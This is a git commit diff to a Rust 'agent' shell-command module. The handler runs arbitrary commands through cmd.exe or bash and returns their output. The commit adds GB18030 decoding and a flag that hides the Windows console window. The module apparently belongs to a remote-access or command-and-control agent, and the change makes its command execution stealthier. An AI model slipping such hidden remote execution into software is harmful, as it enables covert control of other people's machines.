fb834ee3b8fa8b53ede646055074018499b4fe6f
pikachu <hitcxy.cn@gmail.com>
2022-05-30 20:57:29 +0800

    add additional encoding support in shell module

--- agent/src/cmd/shell.rs
+++ agent/src/cmd/shell.rs
@@ -1,20 +1,25 @@
+extern crate encoding;
+use encoding::all::GB18030;
+use encoding::{DecoderTrap,EncoderTrap,Encoding};
 use std::process::Command;
 use std::error::Error;
 use crate::cmd::CommandArgs;
 
 
 /// Executes the given shell command.
-/// 
+///
 /// On Windows, calls out to `cmd.exe`.
-/// 
+///
 /// On Linux, calls out to `/bin/bash`.
-/// 
+///
 /// Usage: `shell [command]`
 pub async fn handle(cmd_args: &mut CommandArgs) -> Result<String, Box<dyn Error>> {
 
     let output: std::process::Output;
     #[cfg(windows)] {
+        use std::os::windows::process::CommandExt;
         output = Command::new("cmd")
+            .creation_flags(0x08000000)
             .arg("/c")
             .arg(cmd_args.to_string())
             .output()
@@ -39,9 +44,11 @@ pub async fn handle(cmd_args: &mut CommandArgs) -> Result<String, Box<dyn Error>
 
     let output_string: String;
     if output.stderr.len() > 0 {
-        output_string = String::from_utf8(output.stderr).unwrap();
+        let result1:&[u8] = &output.stderr;
+        output_string = GB18030.decode(result1, DecoderTrap::Strict).unwrap_or("Pls check your command or args.".to_string());
     } else {
-        output_string = String::from_utf8(output.stdout).unwrap();
+        let result2:&[u8] = &output.stdout;
+        output_string = GB18030.decode(result2, DecoderTrap::Strict).unwrap_or("Some decode error.".to_string());
     }
     Ok(output_string)
 }
